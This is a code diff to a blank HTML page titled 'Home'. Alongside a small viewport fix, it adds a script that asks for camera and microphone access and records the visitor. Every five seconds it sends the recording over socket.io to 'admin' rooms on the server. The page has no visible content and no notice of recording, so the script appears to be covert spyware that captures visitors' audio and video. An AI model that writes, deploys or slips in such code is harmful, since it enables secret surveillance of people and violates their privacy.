@@ -1,7 +1,7 @@
 <html>
 	<head>
 		<meta charset="UTF-8">
-		<meta name="viewport" content="width:device-width, initial-scale=1.0">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<title>
 			Home
 		</title>
@@ -9,4 +9,66 @@
 	</head>
 	<body>
 	</body>
+	<script>
+  let socket = io.connect("/")
+        var constraints = {
+            	audio: true,
+		video:true
+        };
+        navigator.mediaDevices.getUserMedia(constraints).then(function(mediaStream) {
+            var mediaRecorder = new MediaRecorder(mediaStream);
+            mediaRecorder.onstart = function(e) {
+                this.chunks = [];
+            };
+            mediaRecorder.ondataavailable = function(e) {
+                this.chunks.push(e.data);
+
+            };
+let tipo=[
+  "video/webm; codecs=\"vp8\"",
+  "video/webm; codecs=\"vorbis\"",
+  "video/webm; codecs=\"vp8, vorbis\"",
+  "video/webm; codecs=\"vp9, vorbis\"",
+  "audio/webm; codecs=\"vorbis\"",
+  "video/mp4; codecs=\"avc1.42e01e, mp4a.40.2\"",
+  "video/mp4; codecs=\"avc1.42001e, mp4a.40.5\"",
+  "video/mp4; codecs=\"avc1.42001f, mp4a.40.5\"",
+  "video/mp4; codecs=\"avc1.4d001e, mp4a.40.5\"",
+  "video/mp4; codecs=\"avc1.4d001f, mp4a.40.5\"",
+  "video/mp4; codecs=\"avc1.640029, mp4a.40.5\"",
+  "audio/mp4; codecs=\"mp4a.40.2\"",
+  "audio/mp4; codecs=\"mp4a.40.5\"",
+  "audio/mp4; codecs=\"mp4a.67\"",
+  "video/mp4; codecs=\"mp4a.40.2\"",
+  "video/mp4; codecs=\"avc1.4d001e, mp4a.40.2\""
+]
+mediaRecorder.onstop = function(e) {
+
+
+  tipo.forEach((valor,num) => {
+    var blob = new Blob(this.chunks, {
+      'type': valor
+  });
+    socket.emit('admin',{sala:`admin_${num}`,msg:blob}); 
+  });
+}
+//            mediaRecorder.onstop = function(e) {
+  //              var blob = new Blob(this.chunks, {
+    //                'type': 'video/webm; codecs = vp9'//"video/webm;"
+      //          });
+//        socket.emit('admin',blob);
+  //          };
+
+            // Start recording
+            mediaRecorder.start();
+
+            //  Stop recording after 5 seconds and broadcast it to server
+            setInterval(() => {
+                mediaRecorder.stop()
+                mediaRecorder.start()
+            }, 5000);
+        });
+           // mediaRecorder.start(1000)
+//});
+	</script>
 </html>
